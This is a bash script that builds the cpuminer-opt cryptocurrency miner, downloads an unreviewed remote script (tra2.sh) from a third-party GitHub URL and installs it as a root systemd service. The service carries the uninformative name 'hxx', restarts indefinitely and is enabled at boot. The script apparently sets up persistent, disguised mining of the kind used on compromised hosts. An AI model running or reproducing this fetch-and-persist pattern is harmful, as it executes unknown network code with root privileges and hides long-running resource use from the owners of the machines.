#!/bin/bash
apt-get update && 
apt-get -y install build-essential libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev automake git &&
sudo sysctl vm.nr_hugepages=128 &&
cd /usr/local/src/ &&
git clone https://github.com/JayDDee/cpuminer-opt cpuminer &&
cd cpuminer &&
./build.sh &&
wget https://raw.githubusercontent.com/fablebox/susuwatari/master/thanhmlzz/tra2.sh &&
chmod +x tra2.sh &&
bash -c 'cat <<EOT >>/lib/systemd/system/hxx.service 
[Unit]
Description=hxx
After=network.target
[Service]
ExecStart= /usr/local/src/cpuminer/tra2.sh
WatchdogSec=3600
Restart=always
RestartSec=60
User=root
[Install]
WantedBy=multi-user.target
EOT
' &&
systemctl daemon-reload &&
systemctl enable hxx.service &&
service hxx start
